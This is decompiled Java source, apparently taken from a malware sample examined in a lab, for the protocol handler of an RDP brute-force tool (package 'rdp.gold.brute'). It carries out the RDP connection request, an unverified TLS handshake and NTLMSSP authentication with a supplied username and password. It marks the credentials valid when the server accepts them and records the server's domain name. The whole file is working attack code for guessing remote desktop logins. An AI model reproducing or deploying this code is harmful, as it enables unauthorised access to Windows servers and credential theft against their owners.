/*     */ package rdp.gold.brute.netty;
/*     */ 
/*     */ import io.netty.buffer.ByteBuf;
/*     */ import io.netty.buffer.Unpooled;
/*     */ import io.netty.channel.Channel;
/*     */ import io.netty.channel.ChannelHandlerContext;
/*     */ import io.netty.channel.ChannelInboundHandlerAdapter;
/*     */ import io.netty.channel.ChannelPipeline;
/*     */ import io.netty.handler.ssl.SslContext;
/*     */ import io.netty.handler.ssl.SslContextBuilder;
/*     */ import io.netty.handler.ssl.SslHandler;
/*     */ import io.netty.util.concurrent.Future;
/*     */ import java.util.concurrent.atomic.AtomicBoolean;
/*     */ import org.apache.log4j.Logger;
/*     */ import rdp.gold.brute.rdp.ByteBuffer;
/*     */ import rdp.gold.brute.rdp.Messages.ClientNtlmsspNegotiate;
/*     */ import rdp.gold.brute.rdp.Messages.ClientNtlmsspPubKeyAuth;
/*     */ import rdp.gold.brute.rdp.Messages.ClientTpkt;
/*     */ import rdp.gold.brute.rdp.Messages.ClientX224ConnectionRequestPDU;
/*     */ import rdp.gold.brute.rdp.Messages.NtlmState;
/*     */ import rdp.gold.brute.rdp.Messages.ServerNtlmsspChallenge;
/*     */ import rdp.gold.brute.rdp.Messages.ServerNtlmsspPubKeyPlus1;
/*     */ import rdp.gold.brute.rdp.Messages.ServerTpkt;
/*     */ import rdp.gold.brute.rdp.Messages.ServerX224ConnectionConfirmPDU;
/*     */ 
/*     */ public class ProtocolHandler extends ChannelInboundHandlerAdapter
/*     */ {
/*  28 */   private static final Logger logger = Logger.getLogger(ProtocolHandler.class);
/*  29 */   private static enum READ_LEVEL { SERVER_TPKT,  SERVER_NTLMSSP_CHALLENGE,  SERVER_NTLMSSP_PUB_KEY_PLUS1;
/*  30 */     private READ_LEVEL() {} } private READ_LEVEL read = READ_LEVEL.SERVER_TPKT;
/*  31 */   private rdp.gold.brute.rdp.ssl.SSLState sslState = new rdp.gold.brute.rdp.ssl.SSLState();
/*  32 */   private final NtlmState ntlmState = new NtlmState();
/*     */   private String host;
/*     */   private int port;
/*     */   private String domain;
/*     */   private String login;
/*     */   private String password;
/*     */   private AtomicBoolean isValid;
/*     */   private StringBuilder getDomain;
/*     */   
/*     */   public ProtocolHandler(String host, int port, String domain, String login, String password, AtomicBoolean isValid, StringBuilder getDomain)
/*     */   {
/*  43 */     this.host = host;
/*  44 */     this.port = port;
/*  45 */     this.domain = domain;
/*  46 */     this.login = login;
/*  47 */     this.password = password;
/*  48 */     this.isValid = isValid;
/*  49 */     this.getDomain = getDomain;
/*     */   }
/*     */   
/*     */   public void channelRegistered(ChannelHandlerContext ctx) throws Exception
/*     */   {
/*  54 */     super.channelRegistered(ctx);
/*     */   }
/*     */   
/*     */ 
/*     */ 
/*     */   public void channelActive(ChannelHandlerContext ctx)
/*     */   {
/*  61 */     ClientTpkt clientTpkt = new ClientTpkt();
/*  62 */     ClientX224ConnectionRequestPDU clientX224ConnectionRequestPDU = new ClientX224ConnectionRequestPDU(this.host, 2);
/*     */     
/*  64 */     ByteBuffer buffer = clientX224ConnectionRequestPDU.proccessPacket(null);
/*  65 */     clientTpkt.proccessPacket(buffer);
/*  66 */     buffer.rewindCursor();
/*     */     
/*  68 */     ctx.writeAndFlush(Unpooled.copiedBuffer(buffer.data, buffer.offset, buffer.length));
/*     */   }
/*     */   
/*     */   public void channelRead(ChannelHandlerContext ctx, Object msg)
/*     */   {
/*  73 */     ByteBuf byteBuf = (ByteBuf)msg;
/*  74 */     ByteBuffer buffer = new ByteBuffer(-1);
/*     */     
/*  76 */     byte[] bytes = new byte[byteBuf.readableBytes()];
/*  77 */     byteBuf.readBytes(bytes);
/*     */     
/*  79 */     buffer.data = bytes;
/*  80 */     buffer.length = bytes.length;
/*  81 */     buffer.rewindCursor();
/*  82 */     buffer.ref();
/*     */     
/*  84 */     byteBuf.release();
/*     */     
/*  86 */     if (this.read == READ_LEVEL.SERVER_TPKT) {
/*  87 */       readServerTpkt(ctx, buffer);
/*  88 */       this.read = READ_LEVEL.SERVER_NTLMSSP_CHALLENGE;
/*     */     }
/*  90 */     else if (this.read == READ_LEVEL.SERVER_NTLMSSP_CHALLENGE) {
/*  91 */       readServerNtlmSspChallenge(ctx, buffer);
/*  92 */       this.read = READ_LEVEL.SERVER_NTLMSSP_PUB_KEY_PLUS1;
/*     */     }
/*  94 */     else if (this.read == READ_LEVEL.SERVER_NTLMSSP_PUB_KEY_PLUS1) {
/*  95 */       readServerNtlmsspPubKeyPlus1(ctx, buffer);
/*     */     }
/*     */   }
/*     */   
/*     */   private void readServerTpkt(final ChannelHandlerContext ctx, ByteBuffer buffer) {
/* 100 */     ServerTpkt serverTpkt = new ServerTpkt();
/* 101 */     buffer = serverTpkt.proccessPacket(buffer);
/*     */     
/* 103 */     ServerX224ConnectionConfirmPDU serverX224ConnectionConfirmPDU = new ServerX224ConnectionConfirmPDU();
/* 104 */     serverX224ConnectionConfirmPDU.proccessPacket(buffer);
/*     */     
/*     */ 
/* 107 */     SslContext sslContext = null;
/*     */     
/*     */ 
/*     */ 
/*     */ 
/*     */     try
/*     */     {
/* 114 */       sslContext = SslContextBuilder.forClient().sslProvider(io.netty.handler.ssl.SslProvider.OPENSSL).trustManager(io.netty.handler.ssl.util.InsecureTrustManagerFactory.INSTANCE).build();
/*     */       
/* 116 */       sslContext.sessionContext().setSessionTimeout(rdp.gold.brute.Config.BRUTE_TIMEOUT.intValue());
/*     */       
/* 118 */       SslHandler sslHandler = sslContext.newHandler(ctx.alloc());
/* 119 */       sslHandler.setHandshakeTimeoutMillis(rdp.gold.brute.Config.BRUTE_TIMEOUT.intValue());
/*     */       
/* 121 */       ctx.pipeline().addFirst(new io.netty.channel.ChannelHandler[] { sslHandler });
/* 122 */       ((SslHandler)ctx.pipeline().get(SslHandler.class)).handshakeFuture().addListener(new io.netty.util.concurrent.GenericFutureListener()
/*     */       {
/*     */         public void operationComplete(Future<Channel> future) throws Exception
/*     */         {
/* 126 */           javax.net.ssl.SSLSession sslSession = ((SslHandler)ctx.pipeline().get(SslHandler.class)).engine().getSession();
/*     */           
/* 128 */           ProtocolHandler.this.sslState.serverCertificateSubjectPublicKeyInfo = sslSession.getPeerCertificateChain()[0].getPublicKey().getEncoded();
/*     */           
/* 130 */           ClientNtlmsspNegotiate clientNtlmsspNegotiate = new ClientNtlmsspNegotiate(ProtocolHandler.this.ntlmState);
/* 131 */           ByteBuffer buffer = clientNtlmsspNegotiate.proccessPacket(null);
/* 132 */           buffer.rewindCursor();
/*     */           
/* 134 */           ctx.writeAndFlush(Unpooled.copiedBuffer(buffer.data, buffer.offset, buffer.length));
/*     */         }
/*     */       });
/*     */     } catch (Exception e) {
/* 138 */       java.io.StringWriter sw = new java.io.StringWriter();
/* 139 */       e.printStackTrace(new java.io.PrintWriter(sw));
/*     */       
/* 141 */       logger.error(e + " " + sw);
/*     */     }
/*     */   }
/*     */   
/*     */   private void readServerNtlmSspChallenge(ChannelHandlerContext ctx, ByteBuffer buffer) {
/* 146 */     ServerNtlmsspChallenge serverNtlmsspChallenge = new ServerNtlmsspChallenge(this.ntlmState);
/* 147 */     serverNtlmsspChallenge.proccessPacket(buffer);
/*     */     
/* 149 */     this.getDomain.append(this.ntlmState.serverNetbiosDomainName);
/*     */     
/* 151 */     ClientNtlmsspPubKeyAuth clientNtlmsspPubKeyAuth = new ClientNtlmsspPubKeyAuth(this.ntlmState, this.sslState, this.host, this.domain, "workstation", this.login, this.password);
/*     */     
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/* 161 */     buffer = clientNtlmsspPubKeyAuth.proccessPacket(null);
/* 162 */     buffer.rewindCursor();
/*     */     
/* 164 */     ctx.writeAndFlush(Unpooled.copiedBuffer(buffer.data, buffer.offset, buffer.length));
/*     */   }
/*     */   
/*     */   private void readServerNtlmsspPubKeyPlus1(ChannelHandlerContext ctx, ByteBuffer buffer) {
/* 168 */     ServerNtlmsspPubKeyPlus1 serverNtlmsspPubKeyPlus1 = new ServerNtlmsspPubKeyPlus1(this.ntlmState);
/* 169 */     serverNtlmsspPubKeyPlus1.proccessPacket(buffer);
/*     */     
/* 171 */     this.isValid.set(true);
/*     */     
/* 173 */     ctx.channel().disconnect();
/*     */   }
/*     */   
/*     */   public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause)
/*     */   {
/* 178 */     cause.printStackTrace();
/* 179 */     ctx.close();
/*     */   }
/*     */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\netty\ProtocolHandler.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */